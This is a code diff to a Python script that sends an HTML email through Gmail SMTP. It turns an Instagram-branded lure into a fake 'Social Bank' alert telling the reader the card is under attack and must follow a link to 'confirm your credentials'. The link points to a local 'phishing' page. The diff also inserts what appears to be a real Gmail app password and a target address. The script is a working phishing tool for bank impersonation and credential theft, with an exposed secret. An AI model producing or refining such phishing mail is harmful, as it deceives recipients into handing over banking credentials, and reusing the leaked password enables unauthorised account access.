@@ -6,8 +6,8 @@ from email.mime.multipart import MIMEMultipart
 smtp_server = "smtp.gmail.com"
 smtp_port = 587
 sender_email = "tilekusupbekov678@gmail.com"  # Replace with your email address
-sender_password = ""  # Replace with your email password or app-specific password
-receiver_email = ""  # Replace with the recipient's email
+sender_password = "nfpv qbqf trfd wqmv"  # Replace with your email password or app-specific password
+receiver_email = "torozobekov6@gmail.com"  # Replace with the recipient's email
 
 # HTML email content
 subject = "Instagram Login Required"
@@ -69,16 +69,16 @@ body = """
 <body>
    <div class="container">
        <div class="header">
-           <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-           <h2>Instagram</h2>
+           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Logo-Social_Bank.png/800px-Logo-Social_Bank.png?20200115171540" alt="Bank Logo">
+           <h2>Social Bank</h2>
        </div>
-       <p style="font-size: 16px; color: #333;">You have a new notification!</p>
-       <p style="font-size: 16px; color: #333;">Hello, we've got an update for you. Follow the link below to learn more:</p>
+       <p style="font-size: 16px; color: #333;">Your card is under attack!</p>
+       <p style="font-size: 16px; color: #333;">Dear user of the Social Bank, <br>Your bank card is under attack.<br>You need to follow the link and confirm your credentials:</p>
        <p style="font-size: 16px; color: #333;">file:///Users/akim/Projects/phishing/index.html#</p>
-      
+
        <div class="footer">
            <p>If you didn’t request this, you can ignore this message.</p>
-           <p>Instagram Inc., 1601 Willow Road, Menlo Park, CA 94025</p>
+           <p>Social Bank Inc., 1601 Willow Road, Menlo Park, CA 94025</p>
        </div>
    </div>
   <script>
@@ -101,13 +101,13 @@ message.attach(MIMEText(body, "html"))
 
 # Send the email
 try:
-   # Establish a secure session with the server
-   server = smtplib.SMTP(smtp_server, smtp_port)
-   server.starttls()  # Secure the connection
-   server.login(sender_email, sender_password)  # Log into the email server
-   text = message.as_string()
-   server.sendmail(sender_email, receiver_email, text)  # Send the email
-   print("Email sent successfully!")
-   server.quit()  # Close the connection
+    # Establish a secure session with the server
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.starttls()  # Secure the connection
+    server.login(sender_email, sender_password)  # Log into the email server
+    text = message.as_string()
+    server.sendmail(sender_email, receiver_email, text)  # Send the email
+    print("Email sent successfully!")
+    server.quit()  # Close the connection
 except Exception as e:
-   print(f"Error sending email: {e}")
+    print(f"Error sending email: {e}")
